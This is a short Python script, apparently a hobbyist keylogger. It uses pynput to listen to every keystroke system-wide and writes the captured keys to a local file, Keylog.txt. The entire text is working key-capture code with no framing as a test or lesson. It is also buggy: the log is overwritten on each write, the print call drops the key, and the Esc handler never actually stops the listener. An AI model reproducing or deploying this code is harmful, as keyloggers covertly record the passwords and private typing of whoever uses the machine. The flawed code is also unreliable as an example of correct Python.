import pynput

from pynput.keyboard import Key , Listener

count = 0
keys = []


def key_press(key):
    global keys,count
    keys.append(key)
    count+= 1
    

    if count >= 100:
        count = 0
        write_file(keys)
        keys = []
    write_file(keys)
    print(f"pressed".format(key))


def write_file(keys):
    with open('Keylog.txt',"w")as f:
        for key in keys:
            f.write(str(key))
            





def key_released(key):
    if key ==Key.esc:
        return 

with Listener (on_press=key_press, on_release = key_released) as listener:
    listener.join()
